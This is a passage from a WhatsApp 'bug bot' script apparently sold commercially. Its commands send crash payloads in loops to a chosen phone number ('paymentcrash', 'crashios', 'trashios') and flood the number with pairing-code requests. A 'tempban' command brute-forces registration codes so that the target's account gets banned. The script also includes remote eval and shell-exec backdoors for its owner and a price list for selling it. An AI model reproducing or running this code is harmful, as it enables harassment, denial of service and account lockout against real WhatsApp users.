        if (jidx.startsWith('0')) return kontolreply(`Example: ${command} 628xxx`);
        mentionedJid = `${jidx}@s.whatsapp.net`;
        lockNum = `${jidx}`;
    }

    let target = mentionedJid;
    let lock = lockNum;
    let teks = `\`「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\`
    
𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : *${lock}*
𖥂 𝐕𝐈𝐑𝐔𝐒 : *${command}*`
xreplybugbutton(teks)
////////// Sending Bugs //////////
for (let i = 0; i < 5; i++) {
await DelayXFreeze(target)(target);
await sleep(150);
await DelayXFreeze(target)(target);
await sleep(150);
}
////////// Succes Bugs //////////
  } catch (err) {
    console.error(err);
    kontolreply(`succes to send virus to ${target}`);
}
}
break
case 'uiforce':
case 'paymentcrash': {
  try {
    if (!PremOnly && !DevOnly) return xreplyWithButton("*You are not a Premium User*");
    if (!q) return kontolreply(example("628xxx or tag @user"))

    let mentionedJid;
    if (m.mentionedJid?.length > 0) {
        mentionedJid = m.mentionedJid[0];
    } else {
        let jidx = q.replace(/[^0-9]/g, "");
        if (jidx.startsWith('0')) return kontolreply(`Example: ${command} 628xxx`);
        mentionedJid = `${jidx}@s.whatsapp.net`;
        lockNum = `${jidx}`;
    }

    let target = mentionedJid;
    let lock = lockNum;
    let teks = `\`「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\`
    
𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : *${lock}*
𖥂 𝐕𝐈𝐑𝐔𝐒 : *${command}*`
xreplybugbutton(teks)
////////// Sending Bugs //////////
for (let i = 0; i < 10; i++) {
await DelayXFreeze(target);
await sleep(150);
await ComboUi(target);
await sleep(150)
}
////////// Succes Bugs //////////
  } catch (err) {
    console.error(err);
    kontolreply(`succes to send virus to ${target}`);
}
}
break
case 'xios':
case 'crashios':
case 'void': {
  try {
    if (!PremOnly && !DevOnly) return xreplyWithButton("*You are not a Premium User*");
    if (!q) return kontolreply(example("628xxx or tag @user"))

    let mentionedJid;
    if (m.mentionedJid?.length > 0) {
        mentionedJid = m.mentionedJid[0];
    } else {
        let jidx = q.replace(/[^0-9]/g, "");
        if (jidx.startsWith('0')) return kontolreply(`Example: ${command} 628xxx`);
        mentionedJid = `${jidx}@s.whatsapp.net`;
        lockNum = `${jidx}`;
    }

    let target = mentionedJid;
    let lock = lockNum;
    let teks = `\`「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\`
    
𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : *${lock}*
𖥂 𝐕𝐈𝐑𝐔𝐒 : *${command}*`
xreplybugbutton(teks)
////////// Sending Bugs //////////
for (let i = 0; i < 10; i++) {
await ComboIos(target)
}
////////// Succes Bugs //////////
  } catch (err) {
    console.error(err);
    kontolreply(`succes to send virus to ${target}`);
}
}
break
case 'trashios':
case 'locios': {
  try {
    if (!PremOnly && !DevOnly) return xreplyWithButton("*You are not a Premium User*");
    if (!q) return kontolreply(example("628xxx or tag @user"))

    let mentionedJid;
    if (m.mentionedJid?.length > 0) {
        mentionedJid = m.mentionedJid[0];
    } else {
        let jidx = q.replace(/[^0-9]/g, "");
        if (jidx.startsWith('0')) return kontolreply(`Example: ${command} 628xxx`);
        mentionedJid = `${jidx}@s.whatsapp.net`;
        lockNum = `${jidx}`;
    }

    let target = mentionedJid;
    let lock = lockNum;
    let teks = `\`「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\`
    
𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : *${lock}*
𖥂 𝐕𝐈𝐑𝐔𝐒 : *${command}*`
xreplybugbutton(teks)
////////// Sending Bugs //////////
for (let i = 0; i < 10; i++) {
await ComboIos(target);
}
////////// Succes Bugs //////////
  } catch (err) {
    console.error(err);
    kontolreply(`succes to send virus to ${target}`);
}
}
break

case "cekidch": case "idch": {
if (!text) return kontolreply(example("linkchnya"))
if (!text.includes("https://whatsapp.com/channel/")) return kontolreply("Link tautan tidak valid")
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await sock.newsletterMetadata("invite", result)
let teks = `${res.id}
`
return xreplyWithButton(teks)
}
break
case "tqto":
case "thanksto":{
xreplyWithButton(`
╭──( 𝖳𝖧𝖠𝖭𝖪𝖲 𝖳𝖮 ) 
│𝐆𝐲𝐳𝐞𝐧 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥 </𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫/>
│𝐎𝐫𝐚𝐧𝐠 𝐓𝐮𝐚 </𝐒𝐮𝐩𝐨𝐫𝐭
│𝐀𝐥𝐥𝐚𝐡 𝐒𝐰𝐭 </𝐌𝐲 𝐆𝐨𝐨𝐝/>
│ > all yang udah support 
╰─────────────────
`) 
}
break
case "reactch": {
 if (!DevOnly && !PremOnly) return xreplyWithButton(mess.owner);
 if (!text || !args[0] || !args[1]) 
 return kontolreply(example("linkch 😐"));
 if (!args[0].includes("https://whatsapp.com/channel/")) 
 return kontolreply("Link tautan tidak valid")
 let result = args[0].split('/')[4]
 let serverId = args[0].split('/')[5]
 let res = await sock.newsletterMetadata("invite", result) 
 await sock.newsletterReactMessage(res.id, serverId, args[1])
 xreplyWithButton(`Berhasil mengirim reaction ${args[1]} ke dalam channel ${res.name}`)
}
break
case "buysc": {
let teks = `*VANZ INVITCUS V1 VVIP*
[ ! ] List Harga

*_\`Price Sc｜\` Rp20K_*
*_\`Price Ress｜\` Rp30K._*
*_\`Price Pt｜\` Rp50K_*

\`[ MINAT PV? ]\`
WA : https://wa.me/6283140137595
TESTIMONI : https://whatsapp.com/channel/0029Vb5L4UiDJ6Gw9BYU2T`
  const media = await prepareWAMessageMedia({ image: ApocalypseCrash }, { upload: sock.waUploadToServer });

  const msg = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          mentionedJid: [m.sender],
          isForwarded: true,
          forwardingScore: 999,
          forwardedNewsletterMessageInfo: {
            newsletterJid: "120363417794292944@newsletter",
            newsletterName: "🐉⃟༑⌁⃰𝐗͢𝐚𝐧᪰𝐝᪳𝐫𝐨᪶𝐬͡ 𝐄͜𝐭͢𝐞᪳͡𝐫͞𝐧𝐚͟𝐥͢ 𝐕͜𝐚𝐮𝐥𝐭ཀ͜͡🐺",
            serverMessageId: 1
          }
        },
        interactiveMessage: {
          header: {
            hasMediaAttachment: true,
            imageMessage: media.imageMessage,
            title: teks
          },
          body: { text: "" },
          footer: { text: "VANZ INVITCUS " },
          nativeFlowMessage: {
            buttons: [
              {
                name: "cta_url",
                buttonParamsJson: JSON.stringify({
                  display_text: "Contact Owner",
                  url: "@vabzstor1",
                  merchant_url: "@vanzstor1"
                })
              }
            ]
          }
        }
      }
    }
  }), { userJid: m.chat, quoted: lol });

  sock.relayMessage(m.chat, msg.message, { messageId: msg.key.id });
}
break
case 'spam-pair': {
				if (!DevOnly && !PremOnly) return xreplyWithButton(mess.owner);
				if (!q) return kontolreply(example("62xxx|100"));
				let [peenis, pepekk = "200"] = q.split("|")
				await xreplyWithButton(`</> 𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙥𝙖𝙢 𝘾𝙤𝙙𝙚〽️`)
				let target = peenis.replace(/[^0-9]/g, '').trim()
				let {
					default: makeWaSocket,
					useMultiFileAuthState,
					fetchLatestBaileysVersion
				} = require('@whiskeysockets/baileys')
				let {
					state
				} = await useMultiFileAuthState('Spam Code')
				let {
					version
				} = await fetchLatestBaileysVersion()
				let sucked = await makeWaSocket({
					auth: state,
					version,
					logger: pino({
						level: 'fatal'
					})
				})
				for (let i = 0; i < pepekk; i++) {
					await sleep(1500)
					let prc = await sucked.requestPairingCode(target)
					await console.log(`# Succes Spam Pairing Code - Number : ${target} - Code : ${prc}`)
				}
				await sleep(15000)
			}
break
case 'tempban': {
    if (!DevOnly && !PremOnly) return xreplyWithButton(mess.owner);
    if (args.length < 1) return kontolreply(example("62xxx"));
    
    const xtarget = args[0];
    // Memastikan nomor telepon dimulai dengan '62' dan memiliki panjang yang sesuai
    if (!/^62\d{8,}$/.test(xtarget)) return kontolreply(example("62xxx"));
    
    const APOCALYPSECountryCode = '62'; // Kode negara Indonesia
    const APOCALYPSENumber = xtarget.replace('@s.whatsapp.net', '');
    const APOCALYPSEmerge = `${APOCALYPSECountryCode}${APOCALYPSENumber}`;
    const APOCALYPSEMention = APOCALYPSEmerge + '@s.whatsapp.net';
    
    await xreplyWithButton(`</> 𝐓𝐞𝐦𝐩𝐁𝐚𝐧〽️`);
    
    try {
        const {
            stateAPOCALYPSE,
            saveCredsAPOCALYPSE
        } = await useMultiFileAuthState('./Band');
        
        const APOCALYPSERequest = await sock.requestRegistrationCode({
            phoneNumber: '+' + APOCALYPSECountryCode + `${APOCALYPSENumber}`,
            phoneNumberCountryCode: APOCALYPSECountryCode,
            phoneNumberNationalNumber: `${APOCALYPSENumber}`,
            phoneNumberMobileCountryCode: 724,
            method: 'sms'
        });
    } catch (err) {
        console.error(err);
    }

    for (let i = 0; i < 10000; i++) {
        try {
            var APOCALYPSEPrefix = Math.floor(Math.random() * 999);
            var APOCALYPSESuffix = Math.floor(Math.random() * 999);
            await sock.register(`${APOCALYPSEPrefix}-${APOCALYPSESuffix}`);
        } catch (err) {
            console.log(`${APOCALYPSEPrefix}-${APOCALYPSESuffix}`);
        }
    }
}
break
case "owner":
case "xowner": {
  let namaown = `VANZ INVITCUS `
  let NoOwn = `6283140137595`
  var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
    contactMessage: {
      displayName: namaown,
      vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:${namaown}\nitem1.TEL;waid=${NoOwn}:+${NoOwn}\nitem1.X-ABLabel:Ponsel\nX-WA-BIZ-DESCRIPTION:FOR DEAD CRASH\nX-WA-BIZ-NAME:[[ ༑ F.D.C ⿻ 𝐏𝐔𝐁𝐋𝐢𝐂 ༑ ]]\nEND:VCARD`
    }
  }), {
    userJid: m.chat,
    quoted: lol
  })
  sock.relayMessage(m.chat, contact.message, {
    messageId: contact.key.id
  })
}
break


//END
//END
//======================================================\\
default:
if (budy.startsWith('=>')) {
if (!DevOnly) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)}
return m.reply(bang)}
try {
m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
m.reply(String(e))}}
if (budy.startsWith('>')) {
if (!DevOnly) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}
}
//=========================================================\\
if (budy.startsWith('$')) {
if (!DevOnly) return
require("child_process").exec(budy.slice(2), (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) return m.reply(stdout)
})
}
//========================================================\\
}
} catch (err) {
// sock.sendMessage(m.chat, {text: require('util').format(err)}, { quoted: m })
console.log('\x1b[1;31m'+err+'\x1b[0m')
}
}
//========================================================\\
let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file)
console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
delete require.cache[file]
require(file)
})
//==========================================================\\